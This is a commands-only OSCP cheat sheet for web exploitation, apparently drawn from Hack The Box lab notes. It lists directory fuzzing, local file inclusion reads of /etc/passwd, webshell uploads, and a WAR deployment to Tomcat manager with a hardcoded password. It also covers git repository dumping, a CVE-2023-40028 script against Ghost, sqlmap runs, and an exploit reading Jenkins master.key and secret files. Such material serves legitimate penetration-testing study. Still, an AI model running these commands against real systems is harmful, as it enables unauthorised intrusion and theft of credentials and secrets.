# OSCP - Web Exploitation (Commands only)

## Recon
curl -I http://TARGET
whatweb -v http://TARGET
nikto -h http://TARGET
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -k
ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 50 -k -mc 200,301,302,401,403

## LFI / RCE checks
curl "http://TARGET/?page=../../../../etc/passwd"
curl "http://TARGET/?file=../../../../../../etc/passwd"
curl -s "http://TARGET/uploads/shell.php" --data-binary @shell.php -H "Content-Type: application/x-php"

## Upload / execute
mv shell.txt shell.txtwp-load.php
curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://TARGET:8080/manager/text/deploy?path=/shell&update=true"

## Git leakage
git-dumper http://TARGET/ ./repo
cd repo && git restore --staged . && git diff

## Blade / Ghost / CVE specific
chmod +x CVE-2023-40028.sh
./CVE-2023-40028.sh -u admin@TARGET -p 'PASSWORD'

## SQLi & API
sqlmap -u "http://TARGET/vuln.php?id=1" --batch --dbs
curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' | jq

## File read & exfil
curl "http://TARGET/path/to/.git/HEAD"
python3 -c "import sys,base64;print(base64.b64encode(open(sys.argv[1],'rb').read()).decode())" file

## Server-side request tricks
curl -s "http://TARGET/?message=http://TARGET/shrunk/6891bb368e2ef.jpeg&status=success"

## Exploit chains (examples)
python3 51993.py -u http://TARGET -p /var/jenkins_home/secrets/master.key | xxd -p -c 256
python3 51993.py -u http://TARGET -p /var/jenkins_home/secrets/hudson.util.Secret | base64 -w0

## Sources
[Linux/Pilgrimage/notes.txt](Linux/Pilgrimage/notes.txt)
[Linux/Builder/notes.txt](Linux/Builder/notes.txt)
[Linux/UpDown/notes.txt](Linux/UpDown/notes.txt)
[Linux/TartarSauce/notes.txt](Linux/TartarSauce/notes.txt)
[Linux/LinkVortex/notes.txt](Linux/LinkVortex/notes.txt)
